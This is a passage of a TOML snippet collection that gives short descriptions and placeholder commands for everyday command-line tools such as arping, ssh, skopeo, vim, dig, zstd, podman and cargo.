  output = ""

[[snippets]]
  description = "Enter the gitsome shell (optional), to enable autocompletion and interactive help for Git (and gh) commands"
  command = "gitsome"
  output = ""

[[snippets]]
  description = "Setup GitHub integration with the current account"
  command = "gh configure"
  output = ""

[[snippets]]
  description = "List notifications for the current account (as would be seen in <https://github.com/notifications>)"
  command = "gh notifications"
  output = ""

[[snippets]]
  description = "List the current account's starred repos, filtered by a given search string"
  command = "gh starred ""<python 3>"""
  output = ""

[[snippets]]
  description = "View the recent activity feed of a given GitHub repository"
  command = "gh feed <tldr-pages/tldr>"
  output = ""

[[snippets]]
  description = "View the recent activity feed for a given GitHub user, using the default pager (e.g. `less`)"
  command = "gh feed <torvalds> -p"
  output = ""

[[snippets]]
  description = "Ping a host by ARP request packets"
  command = "arping <host_ip>"
  output = ""

[[snippets]]
  description = "Ping a host on a specific interface"
  command = "arping -I <interface> <host_ip>"
  output = ""

[[snippets]]
  description = "Ping a host and [f]inish after the first reply"
  command = "arping -f <host_ip>"
  output = ""

[[snippets]]
  description = "Ping a host a specific number ([c]ount) of times"
  command = "arping -c <count> <host_ip>"
  output = ""

[[snippets]]
  description = "Broadcast ARP request packets to update neighbours' ARP caches ([U]nsolicited ARP mode)"
  command = "arping -U <ip_to_broadcast>"
  output = ""

[[snippets]]
  description = "[D]etect duplicated IP addresses in the network by sending ARP requests with a 3 second timeout"
  command = "arping -D -w <3> <ip_to_check>"
  output = ""

[[snippets]]
  description = "Install a project's dependencies, listed in its bower.json"
  command = "bower install"
  output = ""

[[snippets]]
  description = "Install one or more packages to the bower_components directory"
  command = "bower install <package> <package>"
  output = ""

[[snippets]]
  description = "Uninstall packages locally from the bower_components directory"
  command = "bower uninstall <package> <package>"
  output = ""

[[snippets]]
  description = "List local packages and possible updates"
  command = "bower list"
  output = ""

[[snippets]]
  description = "Create a `bower.json` file for your package"
  command = "bower init"
  output = ""

[[snippets]]
  description = "Install a specific dependency version, and add it to `bower.json`"
  command = "bower install <local_name>=<package>#<version> --save"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "bower help <command>"
  output = ""

[[snippets]]
  description = "Print group memberships for the current user"
  command = "groups"
  output = ""

[[snippets]]
  description = "Print group memberships for a list of users"
  command = "groups <username1 username2 ...>"
  output = ""

[[snippets]]
  description = "Convert an image from JPG to PNG"
  command = "convert <path/to/input_image.jpg> <path/to/output_image.png>"
  output = ""

[[snippets]]
  description = "Scale an image to 50% of its original size"
  command = "convert <path/to/input_image.png> -resize 50% <path/to/output_image.png>"
  output = ""

[[snippets]]
  description = "Scale an image keeping the original aspect ratio to a maximum dimension of 640x480"
  command = "convert <path/to/input_image.png> -resize 640x480 <path/to/output_image.png>"
  output = ""

[[snippets]]
  description = "Horizontally append images"
  command = "convert <path/to/image1.png path/to/image2.png ...> +append <path/to/output_image.png>"
  output = ""

[[snippets]]
  description = "Vertically append images"
  command = "convert <path/to/image1.png path/to/image2.png ...> -append <path/to/output_image.png>"
  output = ""

[[snippets]]
  description = "Create a GIF from a series of images with 100ms delay between them"
  command = "convert <path/to/image1.png path/to/image2.png ...> -delay <10> <path/to/animation.gif>"
  output = ""

[[snippets]]
  description = "Create an image with nothing but a solid red background"
  command = "convert -size <800x600> ""xc:<#ff0000>"" <path/to/image.png>"
  output = ""

[[snippets]]
  description = "Create a favicon from several images of different sizes"
  command = "convert <path/to/image1.png path/to/image2.png ...> <path/to/favicon.ico>"
  output = ""

[[snippets]]
  description = "Display all input data using the specified data configuration"
  command = "ffe --configuration=<path/to/config.ffe> <path/to/input>"
  output = ""

[[snippets]]
  description = "Convert an input file to an output file in a new format"
  command = "ffe --output=<path/to/output> -c <path/to/config.ffe> <path/to/input>"
  output = ""

[[snippets]]
  description = "Select input structure and print format from definitions in `~/.fferc` configuration file"
  command = "ffe --structure=<structure> --print=<format> <path/to/input>"
  output = ""

[[snippets]]
  description = "Write only the selected fields"
  command = "ffe --field-list=""<FirstName,LastName,Age>"" -c <path/to/config.ffe> <path/to/input>"
  output = ""

[[snippets]]
  description = "Write only the records that match an expression"
  command = "ffe -e ""<LastName=Smith>"" -c <path/to/config.ffe> <path/to/input>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ffe --help"
  output = ""

[[snippets]]
  description = "Scan the current local network"
  command = "arp-scan --localnet"
  output = ""

[[snippets]]
  description = "Scan an IP network with a custom bitmask"
  command = "arp-scan <192.168.1.1>/<24>"
  output = ""

[[snippets]]
  description = "Scan an IP network within a custom range"
  command = "arp-scan <127.0.0.0>-<127.0.0.31>"
  output = ""

[[snippets]]
  description = "Scan an IP network with a custom net mask"
  command = "arp-scan <10.0.0.0>:<255.255.255.0>"
  output = ""

[[snippets]]
  description = "Inspect a remote image from a registry"
  command = "skopeo inspect docker://<registry_hostname>/<image:tag>"
  output = ""

[[snippets]]
  description = "List available tags for a remote image"
  command = "skopeo list-tags docker://<registry_hostname>/<image>"
  output = ""

[[snippets]]
  description = "Download an image from a registry"
  command = "skopeo copy docker://<registry_hostname>/<image:tag> dir:<path/to/directory>"
  output = ""

[[snippets]]
  description = "Copy an image from one registry to another"
  command = "skopeo copy docker://<source_registry>/<image:tag> docker://<destination_registry>/<image:tag>"
  output = ""

[[snippets]]
  description = "Delete an image from a registry"
  command = "skopeo delete docker://<registry_hostname>/<image:tag>"
  output = ""

[[snippets]]
  description = "Log in to a registry"
  command = "skopeo login --username <username> <registry_hostname>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr vim"
  output = ""

[[snippets]]
  description = "Search a single directory"
  command = "jdupes <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search multiple directories"
  command = "jdupes <directory1> <directory2>"
  output = ""

[[snippets]]
  description = "Search all directories recursively"
  command = "jdupes --recurse <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search directory recursively and let user choose files to preserve"
  command = "jdupes --delete --recurse <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search multiple directories and follow subdirectores under directory2, not directory1"
  command = "jdupes <directory1> --recurse: <directory2>"
  output = ""

[[snippets]]
  description = "Search multiple directories and keep the directory order in result"
  command = "jdupes -O <directory1> <directory2> <directory3>"
  output = ""

[[snippets]]
  description = "Connect to a remote server"
  command = "ssh <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect to a remote server with a specific identity (private key)"
  command = "ssh -i <path/to/key_file> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect to a remote server using a specific port"
  command = "ssh <username>@<remote_host> -p <2222>"
  output = ""

[[snippets]]
  description = "Run a command on a remote server with a [t]ty allocation allowing interaction with the remote command"
  command = "ssh <username>@<remote_host> -t <command> <command_arguments>"
  output = ""

[[snippets]]
  description = "SSH tunneling: Dynamic port forwarding (SOCKS proxy on `localhost:1080`)"
  command = "ssh -D <1080> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "SSH tunneling: Forward a specific port (`localhost:9999` to `example.org:80`) along with disabling pseudo-[T]ty allocation and executio[N] of remote commands"
  command = "ssh -L <9999>:<example.org>:<80> -N -T <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "SSH jumping: Connect through a jumphost to a remote server (Multiple jump hops may be specified separated by comma characters)"
  command = "ssh -J <username>@<jump_host> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Agent forwarding: Forward the authentication information to the remote machine (see `man ssh_config` for available options)"
  command = "ssh -A <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Convert an e-book into another format"
  command = "ebook-convert <path/to/input_file> <output_file>"
  output = ""

[[snippets]]
  description = "Convert Markdown or HTML to e-book with TOC, title and author"
  command = "ebook-convert <path/to/input_file> <output_file> --level1-toc=""//h:h1"" --level2-toc=""//h:h2"" --level3-toc=""//h:h3"" --title=<title> --authors=<author>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "vim <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file at a specified line number"
  command = "vim +<line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "View Vim's help manual"
  command = ":help<Enter>"
  output = ""

[[snippets]]
  description = "Save and quit the current buffer"
  command = ":wq<Enter>"
  output = ""

[[snippets]]
  description = "Enter normal mode and undo the last operation"
  command = "<Esc>u"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file (press `n`/`N` to go to next/previous match)"
  command = "/<search_pattern><Enter>"
  output = ""

[[snippets]]
  description = "Perform a regular expression substitution in the whole file"
  command = ":%s/<regular_expression>/<replacement>/g<Enter>"
  output = ""

[[snippets]]
  description = "Display the line numbers"
  command = ":set nu<Enter>"
  output = ""

[[snippets]]
  description = "List all Linodes"
  command = "linode-cli linodes list"
  output = ""

[[snippets]]
  description = "Create a new Linode"
  command = "linode-cli linodes create --type <linode_type> --region <region> --image <image_id>"
  output = ""

[[snippets]]
  description = "View details of a specific Linode"
  command = "linode-cli linodes view <linode_id>"
  output = ""

[[snippets]]
  description = "Update settings for a Linode"
  command = "linode-cli linodes update <linode_id> --label <[new_label>"
  output = ""

[[snippets]]
  description = "Delete a Linode"
  command = "linode-cli linodes delete <linode_id>"
  output = ""

[[snippets]]
  description = "Perform a power management operation on a Linode"
  command = "linode-cli linodes <boot|reboot|shutdown> <linode_id>"
  output = ""

[[snippets]]
  description = "List available backups for a Linode"
  command = "linode-cli linodes backups-list <linode_id>"
  output = ""

[[snippets]]
  description = "Restore a backup to a Linode"
  command = "linode-cli linodes backups-restore <linode_id> --backup-id <backup_id>"
  output = ""

[[snippets]]
  description = "Pin the `nixpkgs` revision to the current version of the upstream repository"
  command = "nix registry pin <nixpkgs>"
  output = ""

[[snippets]]
  description = "Pin an entry to the latest version of the branch, or a particular reivision of a github repository"
  command = "nix registry pin <entry> <github:owner/repo/branch_or_revision>"
  output = ""

[[snippets]]
  description = "Add a new entry that always points to the latest version of a github repository, updating automatically"
  command = "nix registry add <entry> <github:owner/repo>"
  output = ""

[[snippets]]
  description = "Remove a registry entry"
  command = "nix registry remove <entry>"
  output = ""

[[snippets]]
  description = "See documentation about what Nix flake registries are"
  command = "nix registry --help"
  output = ""

[[snippets]]
  description = "Install an SDK version"
  command = "sdk install <sdk_name> <sdk_version>"
  output = ""

[[snippets]]
  description = "Use a specific SDK version for the current terminal session"
  command = "sdk use <sdk_name> <sdk_version>"
  output = ""

[[snippets]]
  description = "Show the stable version of any available SDK"
  command = "sdk current <sdk_name>"
  output = ""

[[snippets]]
  description = "Show the stable versions of all installed SDKs"
  command = "sdk current"
  output = ""

[[snippets]]
  description = "List all available SDKs"
  command = "sdk list"
  output = ""

[[snippets]]
  description = "List all versions of an SDK"
  command = "sdk list <sdk_name>"
  output = ""

[[snippets]]
  description = "Upgrade an SDK to the latest stable version"
  command = "sdk upgrade <sdk_name>"
  output = ""

[[snippets]]
  description = "Uninstall a specific SDK version"
  command = "sdk rm <sdk_name> <sdk_version>"
  output = ""

[[snippets]]
  description = "List all tests performed"
  command = "ooniprobe list"
  output = ""

[[snippets]]
  description = "Show information about a specific test"
  command = "ooniprobe list <7>"
  output = ""

[[snippets]]
  description = "Run all available tests"
  command = "ooniprobe run all"
  output = ""

[[snippets]]
  description = "Perform a specific test"
  command = "ooniprobe run <performance>"
  output = ""

[[snippets]]
  description = "Check the availability of a specific website"
  command = "ooniprobe run websites --input <https://ooni.org/>"
  output = ""

[[snippets]]
  description = "Check the availability of all websites listed in a file"
  command = "ooniprobe run websites --input-file <path/to/my-websites.txt>"
  output = ""

[[snippets]]
  description = "Display detailed information about a test in JSON format"
  command = "ooniprobe show <9>"
  output = ""

[[snippets]]
  description = "List all available repositories from which a package can be installed"
  command = "tlmgr candidates <package>"
  output = ""

[[snippets]]
  description = "Display calendar for the current month"
  command = "gcal"
  output = ""

[[snippets]]
  description = "Display calendar for the month of February of the year 2010"
  command = "gcal <2> <2010>"
  output = ""

[[snippets]]
  description = "Provide calendar sheet with week numbers"
  command = "gcal --with-week-number"
  output = ""

[[snippets]]
  description = "Change starting day of week to 1st day of the week (Monday)"
  command = "gcal --starting-day=<1>"
  output = ""

[[snippets]]
  description = "Display the previous, current and next month surrounding today"
  command = "gcal ."
  output = ""

[[snippets]]
  description = "Open the main page"
  command = "rustup doc"
  output = ""

[[snippets]]
  description = "Open the documentation for a specific topic (a module in the standard library, a type, a keyword, etc.)"
  command = "rustup doc <std::fs|usize|fn|...>"
  output = ""

[[snippets]]
  description = "Open the Rust Programming Language book"
  command = "rustup doc --book"
  output = ""

[[snippets]]
  description = "Open the Cargo book"
  command = "rustup doc --cargo"
  output = ""

[[snippets]]
  description = "Open the Rust Reference"
  command = "rustup doc --reference"
  output = ""

[[snippets]]
  description = "Compile Go program in the current directory for all operating systems and architecture combinations"
  command = "gox"
  output = ""

[[snippets]]
  description = "Download and compile a Go program from a remote URL"
  command = "gox <url_1> <url_2>"
  output = ""

[[snippets]]
  description = "Compile current directory for a particular operating system"
  command = "gox -os=""<os>"""
  output = ""

[[snippets]]
  description = "Compile current directory for a single operating system and architecture combination"
  command = "gox -osarch=""<os>/<arch>"""
  output = ""

[[snippets]]
  description = "Enable an application over USB or NFC (`--enable` can be used multiple times to specify more applications)"
  command = "ykman config <usb|nfc> --enable <otp|u2f|fido2|oath|piv|openpgp|hsmauth>"
  output = ""

[[snippets]]
  description = "Disable an application over USB or NFC (`--disable` can be used multiple times to specify more applications)"
  command = "ykman config <usb|nfc> --disable <otp|u2f|fido2|oath|piv|openpgp|hsmauth>"
  output = ""

[[snippets]]
  description = "Disable all applications over NFC"
  command = "ykman config nfc --disable-all"
  output = ""

[[snippets]]
  description = "Initialize project files (`lerna.json`, `package.json`, `.git`, etc.)"
  command = "lerna init"
  output = ""

[[snippets]]
  description = "Install all external dependencies of each package and symlink together local dependencies"
  command = "lerna bootstrap"
  output = ""

[[snippets]]
  description = "Run a specific script for every package that contains it in its `package.json`"
  command = "lerna run <script>"
  output = ""

[[snippets]]
  description = "Execute an arbitrary shell command in every package"
  command = "lerna exec -- <ls>"
  output = ""

[[snippets]]
  description = "Publish all packages that have changed since the last release"
  command = "lerna publish"
  output = ""

[[snippets]]
  description = "Print a file to the default printer"
  command = "lpr <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 2 copies"
  command = "lpr -# <2> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print to a named printer"
  command = "lpr -P <printer> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print either a single page (e.g. 2) or a range of pages (e.g. 2–16)"
  command = "lpr -o page-ranges=<2|2-16> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print double-sided either in portrait (long) or in landscape (short)"
  command = "lpr -o sides=<two-sided-long-edge|two-sided-short-edge> <path/to/file>"
  output = ""

[[snippets]]
  description = "Set page size (more options may be available depending on setup)"
  command = "lpr -o media=<a4|letter|legal> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print multiple pages per sheet"
  command = "lpr -o number-up=<2|4|6|9|16> <path/to/file>"
  output = ""

[[snippets]]
  description = "Unmount a FUSE filesystem"
  command = "fusermount -u <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Unmount a FUSE filesystem as soon as it becomes unused"
  command = "fusermount -z <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "fusermount --version"
  output = ""

[[snippets]]
  description = "Restore dependencies for a .NET project or solution in the current directory"
  command = "dotnet restore"
  output = ""

[[snippets]]
  description = "Restore dependencies for a .NET project or solution in a specific location"
  command = "dotnet restore <path/to/project_or_solution>"
  output = ""

[[snippets]]
  description = "Restore dependencies without caching the HTTP requests"
  command = "dotnet restore --no-cache"
  output = ""

[[snippets]]
  description = "Force all dependencies to be resolved even if the last restore was successful"
  command = "dotnet restore --force"
  output = ""

[[snippets]]
  description = "Restore dependencies using package source failures as warnings"
  command = "dotnet restore --ignore-failed-sources"
  output = ""

[[snippets]]
  description = "Restore dependencies with a specific verbosity level"
  command = "dotnet restore --verbosity <quiet|minimal|normal|detailed|diagnostic>"
  output = ""

[[snippets]]
  description = "Initialize `git-secret` in a local repository"
  command = "git secret init"
  output = ""

[[snippets]]
  description = "Grant access to the current Git user's email"
  command = "git secret tell -m"
  output = ""

[[snippets]]
  description = "Grant access by email"
  command = "git secret tell <email>"
  output = ""

[[snippets]]
  description = "Revoke access by email"
  command = "git secret killperson <email>"
  output = ""

[[snippets]]
  description = "List emails with access to secrets"
  command = "git secret whoknows"
  output = ""

[[snippets]]
  description = "Register a secret file"
  command = "git secret add <path/to/file>"
  output = ""

[[snippets]]
  description = "Encrypt secrets"
  command = "git secret hide"
  output = ""

[[snippets]]
  description = "Decrypt secret files"
  command = "git secret reveal"
  output = ""

[[snippets]]
  description = "Draw a box around a string"
  command = "echo ""<string>"" | boxes"
  output = ""

[[snippets]]
  description = "[r]emove a box from a string"
  command = "echo ""<string>"" | boxes -r"
  output = ""

[[snippets]]
  description = "Specify the box [d]esign"
  command = "echo ""<string>"" | boxes -d <parchment>"
  output = ""

[[snippets]]
  description = "Specify the box [s]ize (in columns by lines)"
  command = "echo ""<string>"" | boxes -s <10>x<5>"
  output = ""

[[snippets]]
  description = "[a]lign the box text [h]orizonally (at [l]eft, [c]enter or [r]ight)"
  command = "echo ""<string>"" | boxes -a h<l|c|r>"
  output = ""

[[snippets]]
  description = "[a]lign the box text [v]ertically (at [t]op, [c]enter or [b]ottom)"
  command = "echo ""<string>"" | boxes -a v<t|c|b>"
  output = ""

[[snippets]]
  description = "[j]ustify the box text (at [l]eft, [c]enter or [r]ight)"
  command = "echo ""<string>"" | boxes -a j<l|c|r><vt>"
  output = ""

[[snippets]]
  description = "Recursively check the current directory, showing progress on the screen and logging error messages to a file"
  command = "cppcheck . 2> cppcheck.log"
  output = ""

[[snippets]]
  description = "Recursively check a given directory, and don't print progress messages"
  command = "cppcheck --quiet <path/to/directory>"
  output = ""

[[snippets]]
  description = "Check a given file, specifying which tests to perform (by default only errors are shown)"
  command = "cppcheck --enable=<error|warning|style|performance|portability|information|all> <path/to/file.cpp>"
  output = ""

[[snippets]]
  description = "List available tests"
  command = "cppcheck --errorlist"
  output = ""

[[snippets]]
  description = "Check a given file, ignoring specific tests"
  command = "cppcheck --suppress=<test_id1> --suppress=<test_id2> <path/to/file.cpp>"
  output = ""

[[snippets]]
  description = "Check the current directory, providing paths for include files located outside it (e.g. external libraries)"
  command = "cppcheck -I <include/directory_1> -I <include/directory_2> ."
  output = ""

[[snippets]]
  description = "Check a Microsoft Visual Studio project (`*.vcxproj`) or solution (`*.sln`)"
  command = "cppcheck --project=<path/to/project.sln>"
  output = ""

[[snippets]]
  description = "Check validity of a Logstash configuration"
  command = "logstash --configtest --config <logstash_config.conf>"
  output = ""

[[snippets]]
  description = "Run Logstash using configuration"
  command = "sudo logstash --config <logstash_config.conf>"
  output = ""

[[snippets]]
  description = "Run Logstash with the most basic inline configuration string"
  command = "sudo logstash -e 'input {} filter {} output {}'"
  output = ""

[[snippets]]
  description = "Dim the specified PPM image by dimfactor"
  command = "ppmdim <0.6> <path/to/input.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "List currently running podman containers"
  command = "podman ps"
  output = ""

[[snippets]]
  description = "List all podman containers (running and stopped)"
  command = "podman ps --all"
  output = ""

[[snippets]]
  description = "Show the latest created container (includes all states)"
  command = "podman ps --latest"
  output = ""

[[snippets]]
  description = "Filter containers that contain a substring in their name"
  command = "podman ps --filter ""name=<name>"""
  output = ""

[[snippets]]
  description = "Filter containers that share a given image as an ancestor"
  command = "podman ps --filter ""ancestor=<image>:<tag>"""
  output = ""

[[snippets]]
  description = "Filter containers by exit status code"
  command = "podman ps --all --filter ""exited=<code>"""
  output = ""

[[snippets]]
  description = "Filter containers by status (created, running, removing, paused, exited and dead)"
  command = "podman ps --filter ""status=<status>"""
  output = ""

[[snippets]]
  description = "Filter containers that mount a specific volume or have a volume mounted in a specific path"
  command = "podman ps --filter ""volume=<path/to/directory>"" --format ""table <.ID>\t<.Image>\t<.Names>\t<.Mounts>"""
  output = ""

[[snippets]]
  description = "Read a PPM image, apply dithering and save it to a file"
  command = "ppmdither <path/to/image.ppm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Specify the desired number of shades for each primary color"
  command = "ppmdither -red <2> -green <3> -blue <2> <path/to/image.ppm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Specify the dimensions of the dithering matrix"
  command = "ppmdither -dim <2> <path/to/image.ppm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Print the current state of IVPN, including the connection and firewall status"
  command = "ivpn status"
  output = ""

[[snippets]]
  description = "List available servers to connect to"
  command = "ivpn servers"
  output = ""

[[snippets]]
  description = "Show the last few lines of output from all tasks"
  command = "pueue log"
  output = ""

[[snippets]]
  description = "Show the full output of a task"
  command = "pueue log <task_id>"
  output = ""

[[snippets]]
  description = "Show the last few lines of output from several tasks"
  command = "pueue log <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Print a specific number of lines from the tail of output"
  command = "pueue log --lines <number_of_lines> <task_id>"
  output = ""

[[snippets]]
  description = "Send a file or directory"
  command = "croc send <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Send a file or directory with a specific passphrase"
  command = "croc send --code <passphrase> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Receive a file or directory on receiving machine"
  command = "croc <passphrase>"
  output = ""

[[snippets]]
  description = "Send and connect over a custom relay"
  command = "croc --relay <ip_to_relay> send <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Receive and connect over a custom relay"
  command = "croc --relay <ip_to_relay> <passphrase>"
  output = ""

[[snippets]]
  description = "Host a croc relay on the default ports"
  command = "croc relay"
  output = ""

[[snippets]]
  description = "Display parameters and options for a croc command"
  command = "croc <send|relay> --help"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records)"
  command = "dig +short <example.com>"
  output = ""

[[snippets]]
  description = "Get a detailed answer for a given domain (A records)"
  command = "dig +noall +answer <example.com>"
  output = ""

[[snippets]]
  description = "Query a specific DNS record type associated with a given domain name"
  command = "dig +short <example.com> <A|MX|TXT|CNAME|NS>"
  output = ""

[[snippets]]
  description = "Specify an alternate DNS server to query"
  command = "dig @<8.8.8.8> <example.com>"
  output = ""

[[snippets]]
  description = "Perform a reverse DNS lookup on an IP address (PTR record)"
  command = "dig -x <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Find authoritative name servers for the zone and display SOA records"
  command = "dig +nssearch <example.com>"
  output = ""

[[snippets]]
  description = "Perform iterative queries and display the entire trace path to resolve a domain name"
  command = "dig +trace <example.com>"
  output = ""

[[snippets]]
  description = "Query a DNS server over a non-standard [p]ort using the TCP protocol"
  command = "dig +tcp -p <port> @<dns_server_ip> <example.com>"
  output = ""

[[snippets]]
  description = "Search for packages"
  command = "nimble search <search_string>"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "nimble install <package>"
  output = ""

[[snippets]]
  description = "List installed packages"
  command = "nimble list -i"
  output = ""

[[snippets]]
  description = "Create a new Nimble package in the current directory"
  command = "nimble init"
  output = ""

[[snippets]]
  description = "Build a Nimble package"
  command = "nimble build"
  output = ""

[[snippets]]
  description = "Install a Nimble package"
  command = "nimble install"
  output = ""

[[snippets]]
  description = "Force the brightest pixels to be white, the darkest pixels to be black and spread out the ones in between linearly"
  command = "pnmnorm <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Force the brightest pixels to be white, the darkest pixels to be black and spread out the ones in between quadratically such that pixels with a brightness of `n` become 50 % bright"
  command = "pnmnorm -midvalue <n> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Keep the pixels' hue, only modify the brightness"
  command = "pnmnorm -keephues <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify a method to calculate a pixel's brightness"
  command = "pnmnorm -<luminosity|colorvalue|saturation> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Determine changes between different versions of a LaTeX file (the resulting LaTeX file can be compiled to show differences underlined)"
  command = "latexdiff <old.tex> <new.tex> > <diff.tex>"
  output = ""

[[snippets]]
  description = "Determine changes between different versions of a LaTeX file by highlighting differences in boldface"
  command = "latexdiff --type=BOLD <old.tex> <new.tex> > <diff.tex>"
  output = ""

[[snippets]]
  description = "Determine changes between different versions of a LaTeX file, and display minor changes in equations with both added and deleted graphics"
  command = "latexdiff --math-markup=fine --graphics-markup=both <old.tex> <new.tex> > <diff.tex>"
  output = ""

[[snippets]]
  description = "Compress a file into a new file with the `.zst` suffix"
  command = "zstd <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress a file"
  command = "zstd --decompress <path/to/file.zst>"
  output = ""

[[snippets]]
  description = "Decompress to `stdout`"
  command = "zstd --decompress --stdout <path/to/file.zst>"
  output = ""

[[snippets]]
  description = "Compress a file specifying the compression level, where 1=fastest, 19=slowest and 3=default"
  command = "zstd -<level> <path/to/file>"
  output = ""

[[snippets]]
  description = "Unlock higher compression levels (up to 22) using more memory (both for compression and decompression)"
  command = "zstd --ultra -<level> <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert a graph from `gml` to `gv` format"
  command = "gml2gv -o <output.gv> <input.gml>"
  output = ""

[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.gml> | gml2gv > <output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gml2gv -?"
  output = ""

[[snippets]]
  description = "Add a new task which is due tomorrow"
  command = "task add <description> due:<tomorrow>"
  output = ""

[[snippets]]
  description = "Update a task's priority"
  command = "task <task_id> modify priority:<H|M|L>"
  output = ""

[[snippets]]
  description = "Complete a task"
  command = "task <task_id> done"
  output = ""

[[snippets]]
  description = "Delete a task"
  command = "task <task_id> delete"
  output = ""

[[snippets]]
  description = "List all open tasks"
  command = "task list"
  output = ""

[[snippets]]
  description = "List open tasks due before the end of the week"
  command = "task list due.before:<eow>"
  output = ""

[[snippets]]
  description = "Show a graphical burndown chart, by day"
  command = "task burndown.daily"
  output = ""

[[snippets]]
  description = "List all reports"
  command = "task reports"
  output = ""

[[snippets]]
  description = "Create a new project using a template"
  command = "pulumi new"
  output = ""

[[snippets]]
  description = "Create a new stack using an isolated deployment target"
  command = "pulumi stack init"
  output = ""

[[snippets]]
  description = "Configure variables (e.g. keys, regions, etc.) interactively"
  command = "pulumi config"
  output = ""

[[snippets]]
  description = "Preview and deploy changes to a program and/or infrastructure"
  command = "pulumi up"
  output = ""

[[snippets]]
  description = "Preview deployment changes without performing them (dry-run)"
  command = "pulumi preview"
  output = ""

[[snippets]]
  description = "Destroy a program and its infrastructure"
  command = "pulumi destroy"
  output = ""

[[snippets]]
  description = "Display details about the current user"
  command = "pinky"
  output = ""

[[snippets]]
  description = "Display details for a specific user"
  command = "pinky <user>"
  output = ""

[[snippets]]
  description = "Display details in the long format"
  command = "pinky <user> -l"
  output = ""

[[snippets]]
  description = "Omit the user's home directory and shell in long format"
  command = "pinky <user> -lb"
  output = ""

[[snippets]]
  description = "Omit the user's project file in long format"
  command = "pinky <user> -lh"
  output = ""

[[snippets]]
  description = "Omit the column headings in short format"
  command = "pinky <user> -f"
  output = ""

[[snippets]]
  description = "Map all greyscale values of the input image to all colors between the two specified colors"
  command = "pgmtoppm -black <red> --white <blue> <path/to/input.pgm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Map all greyscale values of the input image to colors according to the specified colormap"
  command = "pgmtoppm -map <path/to/colormap.ppm> <path/to/input.pgm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzless"
  output = ""

[[snippets]]
  description = "Print all go processes running locally"
  command = "gops"
  output = ""

[[snippets]]
  description = "Print more information about a process"
  command = "gops <pid>"
  output = ""

[[snippets]]
  description = "Display a process tree"
  command = "gops tree"
  output = ""

[[snippets]]
  description = "Print the current stack trace from a target program"
  command = "gops stack <pid|addr>"
  output = ""

[[snippets]]
  description = "Print the current runtime memory statistics"
  command = "gops memstats <pid|addr>"
  output = ""

[[snippets]]
  description = "Create a new environment, installing the specified packages into it"
  command = "mamba create --name <environment_name> <python=3.10 matplotlib>"
  output = ""

[[snippets]]
  description = "Install packages into the current environment, specifying the package [c]hannel"
  command = "mamba install -c <conda-forge> <python=3.6 numpy>"
  output = ""

[[snippets]]
  description = "Update all packages in the current environment"
  command = "mamba update --all"
  output = ""

[[snippets]]
  description = "Search for a specific package across repositories"
  command = "mamba repoquery search <numpy>"
  output = ""

[[snippets]]
  description = "List all environments"
  command = "mamba info --envs"
  output = ""

[[snippets]]
  description = "Remove unused [p]ackages and [t]arballs from the cache"
  command = "mamba clean -pt"
  output = ""

[[snippets]]
  description = "Activate an environment"
  command = "mamba activate <environment_name>"
  output = ""

[[snippets]]
  description = "List all installed packages in the currently activated environment"
  command = "mamba list"
  output = ""

[[snippets]]
  description = "Search for crates"
  command = "cargo search <search_string>"
  output = ""

[[snippets]]
  description = "Install a binary crate"
  command = "cargo install <crate_name>"
  output = ""

[[snippets]]
  description = "List installed binary crates"
  command = "cargo install --list"
  output = ""

[[snippets]]
  description = "Create a new binary or library Rust project in the specified directory (or the current working directory by default)"
  command = "cargo init --<bin|lib> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Add a dependency to `Cargo.toml` in the current directory"
  command = "cargo add <dependency>"
  output = ""

[[snippets]]
  description = "Build the Rust project in the current directory using the release profile"
  command = "cargo build --release"
  output = ""

[[snippets]]
  description = "Build the Rust project in the current directory using the nightly compiler (requires `rustup`)"
  command = "cargo +nightly build"
  output = ""

[[snippets]]
  description = "Build using a specific number of threads (default is the number of logical CPUs)"
  command = "cargo build --jobs <number_of_threads>"
  output = ""

[[snippets]]
